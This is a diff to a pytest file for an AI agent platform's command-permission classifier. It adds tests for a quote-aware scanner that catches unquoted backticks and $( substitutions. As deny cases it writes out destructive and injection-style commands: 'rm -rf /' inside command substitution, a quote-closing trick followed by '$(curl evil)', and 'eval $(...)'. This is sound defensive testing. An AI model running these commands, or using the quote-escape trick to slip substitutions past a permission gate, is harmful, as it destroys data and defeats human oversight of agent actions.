@@ -15,6 +15,7 @@ import pytest
 
 from claude_pilot.tier1 import (
     INTRA_PLATFORM_AGENTS,
+    contains_unquoted_metacharacter,
     is_safe_bash_command,
     is_safe_git_command,
     is_safe_mika_dispatch,
@@ -66,13 +67,109 @@ def test_read_only_tools_always_approve(tool: str, cwd: str) -> None:
         "find . -type f -exec rm {} ;",
         "echo hi > /tmp/out",
         "echo hi >> /tmp/out",
-        "echo `whoami`",
+        # NOTE: "echo `whoami`" moved to test_unquoted_meta_outside_quotes_denies —
+        # backticks are now caught by contains_unquoted_metacharacter(), not TIER3.
         "cat <(echo hi)",
     ],
 )
 def test_tier3_denies(command: str) -> None:
     assert is_tier3_dangerous(command) is True, command
     assert is_safe_bash_command(command) is False, command
+
+
+# ── mika#946: Quote-aware metacharacter scanner ─────────────────────────────
+# Mirrors contains_unquoted_metacharacter() from
+# crates/mika-agent/src/server/permission_pre_classifier.rs
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Inside double quotes — allow (backtick is literal content)
+        'mika ask --agent mika-arch "brief with `inline code`"',
+        # Inside double quotes — allow ($( is literal content)
+        'mika ask --agent mika-arch "$(literal) text"',
+        # Inside single quotes — allow
+        "mika ask --agent mika-arch '$(literal) text'",
+        "mika ask --agent mika-arch '`inline backtick`'",
+        # Escaped inner quote inside double quotes — allow (no false close)
+        r'mika ask --agent mika-arch "has \"escaped\" and `backtick`"',
+        # Unterminated double-quote — conservative allow (all remaining bytes
+        # treated as inside the quote)
+        'mika ask --agent mika-arch "unterminated with `backtick',
+        # Mixed quotes — single-quoted region containing literal " and backtick
+        "mika ask --agent mika-arch 'a\"b`c'",
+    ],
+)
+def test_unquoted_meta_inside_quotes_allows(command: str) -> None:
+    assert contains_unquoted_metacharacter(command) is False, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Unquoted backtick — deny
+        "echo `whoami`",
+        # Unquoted $( — deny
+        "cat $(secret)",
+        # POSIX single-quote backslash literal — deny (mika#938 F-finding)
+        # Backslash is NOT an escape inside '...', so 'foo\' closes the quote
+        # at the second ' and the backtick that follows is unquoted.
+        r"mika ask 'foo\' `whoami`",
+        r"mika ask 'foo\' $(curl evil)",
+        # After closing quote — deny
+        'mika ask --agent mika-arch "msg" `rm -rf /`',
+        'mika ask --agent mika-arch "msg" $(rm -rf /)',
+    ],
+)
+def test_unquoted_meta_outside_quotes_denies(command: str) -> None:
+    assert contains_unquoted_metacharacter(command) is True, command
+
+
+def test_unquoted_meta_no_metachar_returns_false() -> None:
+    """Plain commands without any metacharacter at all."""
+    assert contains_unquoted_metacharacter("git status") is False
+    assert contains_unquoted_metacharacter("cargo test --release") is False
+    assert contains_unquoted_metacharacter("") is False
+
+
+def test_unquoted_meta_integration_mika_ask_arch_brief() -> None:
+    """Integration: the canonical /mika-ask-arch shape with markdown brief
+    containing inline code now passes the metacharacter check (the whole-pipeline
+    deny would come from is_safe_bash_command's sub-command check, not from
+    the metacharacter scanner)."""
+    cmd = (
+        'mika ask --agent mika-arch --format json --verbose '
+        '"Brief with `inline code` and `docs/plans/file.md`"'
+    )
+    # The metacharacter check should pass (backticks are inside double quotes)
+    assert contains_unquoted_metacharacter(cmd) is False
+    # is_safe_bash_command still returns True because mika ask --agent mika-arch
+    # is in the intra-platform dispatch allow-list
+    assert is_safe_bash_command(cmd) is True
+
+
+def test_echo_backtick_still_denied_via_metachar_check() -> None:
+    """Regression guard: "echo `whoami`" was previously in test_tier3_denies.
+    After mika#946, it's no longer a TIER3 deny (the regex was removed) but
+    is still denied by contains_unquoted_metacharacter(). The end-to-end
+    behavior (is_safe_bash_command returns False) is unchanged."""
+    cmd = "echo `whoami`"
+    # No longer a TIER3 pattern match
+    assert is_tier3_dangerous(cmd) is False
+    # But still caught by the quote-aware scanner
+    assert contains_unquoted_metacharacter(cmd) is True
+    # End-to-end: still denied
+    assert is_safe_bash_command(cmd) is False
+
+
+def test_eval_dollar_paren_still_denied() -> None:
+    """eval $(some_cmd) is still denied — both by TIER3 (eval) and by the
+    metacharacter check ($( is unquoted)."""
+    cmd = "eval $(some_cmd)"
+    assert is_tier3_dangerous(cmd) is True  # 'eval ' pattern
+    assert contains_unquoted_metacharacter(cmd) is True  # $( unquoted
+    assert is_safe_bash_command(cmd) is False
 
 
 # ── Bash: safe commands ──────────────────────────────────────────────────────
